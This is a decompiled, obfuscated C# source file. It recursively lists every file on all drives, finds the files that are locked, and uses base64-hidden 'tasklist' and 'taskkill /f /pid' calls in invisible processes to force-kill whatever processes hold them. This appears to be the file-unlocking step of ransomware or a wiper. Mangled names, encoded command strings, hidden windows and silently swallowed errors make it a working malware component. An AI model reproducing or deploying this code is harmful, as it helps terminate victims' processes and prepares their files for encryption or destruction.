using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;

namespace JcxFVLIspytryi;

internal class nXuDQMcFuNT
{
	[CompilerGenerated]
	private sealed class RBQlQGaQxomaj
	{
		public string dPwttyLumBusVfX;

		public bool _003CKillproc_003Eb__4(string t)
		{
			return t.Contains(dPwttyLumBusVfX);
		}
	}

	public static readonly List<string> gOxioWmfbFyz = new List<string>();

	public static readonly List<string> hEgghwwcRPskx = new List<string>();

	public static void elYIsRIjmaQvuS()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					BdgvNtimBxkVq(driveInfo.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void BdgvNtimBxkVq(string JxFhIcSjEhiN)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(JxFhIcSjEhiN);
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					gOxioWmfbFyz.Add(fileInfo.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					BdgvNtimBxkVq(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
		if (gOxioWmfbFyz.Count <= 0)
		{
			return;
		}
		foreach (string item in gOxioWmfbFyz.Where((string vzUcKrKeXXZ) => kdHgPdvjmWFX(vzUcKrKeXXZ)))
		{
			hEgghwwcRPskx.Add(item);
		}
		gOxioWmfbFyz.Clear();
		if (hEgghwwcRPskx.Count <= 0)
		{
			return;
		}
		foreach (FileInfo item2 in hEgghwwcRPskx.Select((string bvjatcvxEZ) => new FileInfo(bvjatcvxEZ)))
		{
			yNIbqxnTySxV(item2.Name);
		}
	}

	public static bool kdHgPdvjmWFX(string xSqECfHblh)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(xSqECfHblh, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(xSqECfHblh, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void yNIbqxnTySxV(string PrcYrQzGRSKbT)
	{
		try
		{
			string text = RWKDudegyHjYU(dHGXNFcRMdII.BJOIPKGGNMyq("dGFza2xpc3Q="), dHGXNFcRMdII.BJOIPKGGNMyq("L3YgL2ZvIGNzdg=="));
			string[] separator = new string[1] { "\r\n" };
			string[] source = text.Split(separator, StringSplitOptions.None);
			List<string> list = (from t in source
				where t.Contains(PrcYrQzGRSKbT)
				select t into hffYIQsarNinOPw
				select hffYIQsarNinOPw.Split(new char[1] { ',' }) into MkVrniKGXUfzjK
				select MkVrniKGXUfzjK[1].Replace("\"", "")).ToList();
			foreach (string item in list)
			{
				RWKDudegyHjYU(dHGXNFcRMdII.BJOIPKGGNMyq("dGFza2tpbGw="), dHGXNFcRMdII.BJOIPKGGNMyq("L2YgL3BpZCA=") + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string RWKDudegyHjYU(string BWJgRSKcAhrVJW, string FBDTabFLzthQW)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(BWJgRSKcAhrVJW, FBDTabFLzthQW);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}
}
